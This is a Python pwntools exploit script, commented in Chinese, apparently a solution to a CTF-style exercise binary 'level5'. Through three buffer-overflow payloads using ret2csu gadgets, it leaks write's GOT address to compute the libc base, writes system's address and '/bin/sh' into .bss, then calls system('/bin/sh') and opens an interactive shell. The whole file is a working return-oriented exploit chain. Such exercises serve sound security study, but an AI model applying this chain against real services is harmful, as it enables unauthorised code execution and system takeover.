#-*- coding:utf-8 -*-

#初始化，准备工作
from pwn import *
file_path = './level5'
context(binary=file_path,os='linux')
elf = ELF(file_path)

#这里的so文件需要使用ldd命令查看
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process(file_path)

#获取write_got地址
write_got = elf.got['write']
#获取read_got地址，第二段漏洞利用需要用到
read_got = elf.got['read']

#获取main、gadget1、gadget2 函数地址
main_addr = 0x400564
gadget1 = 0x400606
gadget2 = 0x4005F0

##第一步##############################leaklibc#####################################
payload1 = b'A'*0x80 + b'B'*0x8
payload1 += p64(gadget1)
payload1 += p64(0)
payload1 += p64(0)
payload1 += p64(1)
payload1 += p64(write_got)
payload1 += p64(1)
payload1 += p64(write_got)
payload1 += p64(8)
payload1 += p64(gadget2)
payload1 += b'C'*0x38
payload1 += p64(main_addr)

#gdb.attach(p,"b *0x400544")
p.sendafter('Hello, World\n',payload1)

#接收8位字符串内容
write_addr = u64(p.recv(8))
#获取write函数的地址
print("write_addr:"+hex(write_addr))
#获取libc的偏移
libc_base = write_addr - libc.sym['write']
print("libc_base:"+hex(libc_base))
#获取system地址
system_addr = libc_base + libc.sym['system']
print("system_addr:"+hex(system_addr))
#获取binsh字符串地址
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
print("binsh_addr:"+hex(binsh_addr))

##第二步##############################read(0,bss,16)#####################################

bss_addr = 0x601028
payload2 = b'A'*0x80 + b'B'*0x8
payload2 += p64(gadget1)
payload2 += p64(0)
payload2 += p64(0)
payload2 += p64(1)
payload2 += p64(read_got)
payload2 += p64(0)
payload2 += p64(bss_addr)
payload2 += p64(16)
payload2 += p64(gadget2)
payload2 += b'C'*0x38
payload2 += p64(main_addr)
p.sendafter('Hello, World\n',payload2)
sleep(1)
p.send(p64(system_addr) + b'/bin/sh\x00')
sleep(1)

######第三步##############################调用system执行binsh############
payload3 = b'A'*0x80 + b'B'*0x8
payload3 += p64(gadget1)
payload3 += p64(0)
payload3 += p64(0)
payload3 += p64(1)
payload3 += p64(bss_addr)
payload3 += p64(bss_addr+8)
payload3 += p64(0)
payload3 += p64(0)
payload3 += p64(gadget2)
payload3 += b'\x00'*0x38
payload3 += p64(main_addr)
p.sendafter('Hello, World\n',payload3)
p.interactive()

